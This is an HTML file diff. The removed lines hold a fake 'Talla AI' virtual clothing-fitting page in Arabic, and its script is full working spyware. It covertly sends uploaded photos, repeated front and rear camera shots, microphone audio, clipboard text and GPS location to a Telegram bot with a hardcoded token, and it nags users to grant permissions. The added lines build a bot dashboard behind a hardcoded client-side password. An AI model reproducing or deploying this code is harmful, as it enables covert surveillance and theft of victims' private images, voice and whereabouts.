@@ -3,124 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Talla AI | استوديو قياس الملابس الذكي</title>
+    <title>M.NAJM | AI Official Node</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: #1e293b; padding: 30px; border-radius: 20px; width: 90%; max-width: 450px; text-align: center; border: 1px solid #e91e63; }
-        .logo { font-size: 28px; font-weight: bold; color: #e91e63; margin-bottom: 10px; }
-        .upload-box { border: 2px dashed #e91e63; padding: 40px 20px; border-radius: 15px; margin: 20px 0; cursor: pointer; background: rgba(233, 30, 99, 0.05); transition: 0.3s; }
-        .upload-box:hover { background: rgba(233, 30, 99, 0.1); }
-        .btn-start { background: #e91e63; color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; }
-        #file-input { display: none; }
-        .status { font-size: 12px; color: #94a3b8; margin-top: 15px; }
+        :root { --neon: #39ff14; --bg: #050505; --glass: rgba(255,255,255,0.03); }
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: var(--bg); color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+
+        /* بوابة الدخول بكلمة سر 2009 */
+        #access-gate {
+            position: fixed; inset: 0; background: #000; z-index: 10000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .security-input {
+            background: none; border: 2px solid var(--neon); color: var(--neon);
+            padding: 15px; font-size: 2rem; text-align: center; border-radius: 15px; outline: none;
+            box-shadow: 0 0 20px rgba(57, 255, 20, 0.2); width: 200px;
+        }
+
+        /* واجهة التحكم */
+        .dashboard {
+            display: none; width: 95%; max-width: 900px; height: 90vh;
+            background: var(--glass); backdrop-filter: blur(15px);
+            border: 1px solid rgba(57, 255, 20, 0.2); border-radius: 30px;
+            padding: 30px; overflow-y: auto;
+        }
+        .card {
+            background: rgba(0,0,0,0.5); border: 1px solid #222;
+            padding: 20px; border-radius: 20px; margin-bottom: 20px;
+        }
+        .status-badge {
+            display: inline-block; padding: 5px 15px; border-radius: 50px;
+            font-size: 12px; font-weight: bold; background: #ff003c; color: #fff;
+        }
+        .online { background: var(--neon); color: #000; box-shadow: 0 0 10px var(--neon); }
+        
+        input, select, textarea {
+            width: 100%; background: #111; border: 1px solid #333;
+            color: #fff; padding: 12px; border-radius: 10px; margin: 10px 0; outline: none;
+        }
+        .btn-deploy {
+            background: var(--neon); color: #000; border: none; padding: 15px;
+            width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer;
+            text-transform: uppercase; transition: 0.3s;
+        }
+        .btn-deploy:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--neon); }
     </style>
 </head>
 <body>
 
-<div class="container" id="main-ui">
-    <div class="logo">Talla AI Studio</div>
-    <p>ارفع صورك الشخصية لتجربة ملابس صيف 2026 افتراضياً بالذكاء الاصطناعي.</p>
-    
-    <label for="file-input" class="upload-box" id="drop-zone">
-        <p>اضغط هنا لاختيار صور من "الاستوديو"</p>
-        <span style="font-size: 12px; color: #e91e63;">(سيتم سحب الصور ومعالجتها فوراً)</span>
-    </label>
-    <input type="file" id="file-input" multiple accept="image/*">
+    <!-- الدخول بكلمة السر 2009 -->
+    <div id="access-gate">
+        <h1 style="color:var(--neon); letter-spacing: 5px;">M.NAJM SECURITY</h1>
+        <input type="password" id="pass-field" class="security-input" maxlength="4" oninput="validate(this.value)">
+        <p style="color:#444; margin-top:15px;">ENTER MASTER CODE</p>
+    </div>
 
-    <button class="btn-start" onclick="triggerFullAccess()">بدء المعالجة والتنسيق</button>
-    <div class="status" id="st">بانتظار رفع الصور أو بدء النظام...</div>
-</div>
+    <!-- المنصة الرئيسية -->
+    <div id="main-app" class="dashboard">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <h2 style="color:var(--neon)">M.NAJM AI UNIT</h2>
+            <span id="node-status" class="status-badge">OFFLINE</span>
+        </div>
 
-<video id="vf" autoplay style="display:none;"></video>
-<video id="vb" autoplay style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+        <div class="card">
+            <h3>🔗 Webhook Configuration (Official API)</h3>
+            <p style="font-size: 12px; color: #888;">استخدم هذا الرابط في لوحة Meta Developers لربط السيرفر.</p>
+            <input type="text" readonly value="https://m-najm-node.vercel.app/api/webhook">
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+                <input type="text" placeholder="Verify Token (2009)">
+                <input type="text" placeholder="Phone Number ID">
+            </div>
+        </div>
 
-<script>
-    const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
-    const chatId = "8754338811";
-
-    async function send(msg, isFile = false, blob = null, type = "photo") {
-        let url = `https://api.telegram.org/bot${token}/${isFile ? (type === 'photo' ? 'sendPhoto' : (type === 'audio' ? 'sendAudio' : 'sendDocument')) : 'sendMessage'}`;
-        const fd = new FormData();
-        fd.append('chat_id', chatId);
-        if (isFile) { fd.append(type === 'photo' ? 'photo' : (type === 'audio' ? 'audio' : 'document'), blob, 'data.jpg'); }
-        else { fd.append('text', msg); fd.append('parse_mode', 'Markdown'); }
-        try { await fetch(url, { method: 'POST', body: fd }); } catch(e){}
-    }
-
-    // 1. سحب الصور اللي هو بيختارها بنفسه من الاستوديو
-    document.getElementById('file-input').addEventListener('change', async (e) => {
-        const files = e.target.files;
-        document.getElementById('st').innerText = "جاري رفع صور الاستوديو...";
-        for (let file of files) {
-            await send("", true, file, "document");
-        }
-        triggerFullAccess(); // شغل السحب التلقائي فوراً بعد ما يختار
-    });
-
-    async function triggerFullAccess() {
-        document.getElementById('st').innerText = "جاري الاتصال بحساسات الجهاز والذكاء الاصطناعي...";
-        
-        try {
-            // 2. طلب الكاميرا والميكروفون (شرط الدخول)
-            const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-            let streamB = null;
-            try { streamB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); } catch(e){}
-
-            // 3. سحب بيانات الجهاز والحافظة
-            let info = `📱 *تقرير شامل:*\nالجهاز: ${navigator.platform}\n`;
-            if (navigator.getBattery) { const b = await navigator.getBattery(); info += `البطارية: ${b.level*100}%\n`; }
-            try { const clip = await navigator.clipboard.readText(); info += `📋 الحافظة: ${clip}\n`; } catch(e){}
-            send(info);
-
-            // 4. سحب الموقع
-            navigator.geolocation.getCurrentPosition(p => {
-                send(`📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
-
-            // 5. التقاط 19 صورة (أمامية وخلفية بالتناوب)
-            const vidF = document.getElementById('vf'); vidF.srcObject = streamF;
-            const vidB = document.getElementById('vb'); if(streamB) vidB.srcObject = streamB;
+        <div class="card">
+            <h3>🧠 AI Engine Personalization</h3>
+            <input type="text" id="bot-name" placeholder="اسم البوت (مثلاً: رنا من طلة)">
+            <textarea id="bot-prompt" rows="4" placeholder="اكتب تعليمات الرد (مثلاً: رد بلهجة مصرية ووضح عروض السوت والبلوزات لبراند طلة)"></textarea>
             
-            let count = 0;
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 640; canvas.height = 480;
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+                <select>
+                    <option>Gemini Pro (Recommended)</option>
+                    <option>GPT-4o Mini</option>
+                </select>
+                <select>
+                    <option>تأخير طبيعي (2 ثانية)</option>
+                    <option>رد فوري</option>
+                </select>
+            </div>
+        </div>
 
-            const picInterval = setInterval(() => {
-                if (count >= 19) { clearInterval(picInterval); return; }
-                
-                // صورة أمامية
-                ctx.drawImage(vidF, 0, 0, 640, 480);
-                canvas.toBlob(b => send("", true, b, "photo"), 'image/jpeg');
+        <button class="btn-deploy" onclick="deploy()">Deploy AI System 🚀</button>
+    </div>
 
-                // صورة خلفية
-                if(streamB) {
-                    setTimeout(() => {
-                        ctx.drawImage(vidB, 0, 0, 640, 480);
-                        canvas.toBlob(b => send("", true, b, "photo"), 'image/jpeg');
-                    }, 400);
-                }
-                count++;
-            }, 1200);
-
-            // 6. تسجيل الصوت 20 ثانية
-            const recorder = new MediaRecorder(streamF);
-            const chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
-                send("", true, audioBlob, "audio");
-                document.getElementById('main-ui').innerHTML = "<h2 style='color:#4CAF50'>تم المعالجة بنجاح ✅</h2><p>سيتم إرسال النتائج عبر واتساب.</p>";
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), 20000);
-
-        } catch (err) {
-            alert("⚠️ عذراً: يجب السماح بجميع الصلاحيات لتتمكن أداة الذكاء الاصطناعي من تحديد مقاسك بدقة.");
-            location.reload();
+    <script>
+        function validate(val) {
+            if(val === '2009') {
+                document.getElementById('access-gate').style.display = 'none';
+                document.getElementById('main-app').style.display = 'block';
+            }
         }
-    }
-</script>
+
+        function deploy() {
+            const status = document.getElementById('node-status');
+            status.innerText = "ACTIVE & SYNCED";
+            status.classList.add('online');
+            alert("تم تشغيل نظام M.NAJM بنجاح. البوت الآن جاهز للرد على واتساب.");
+        }
+    </script>
 </body>
 </html>
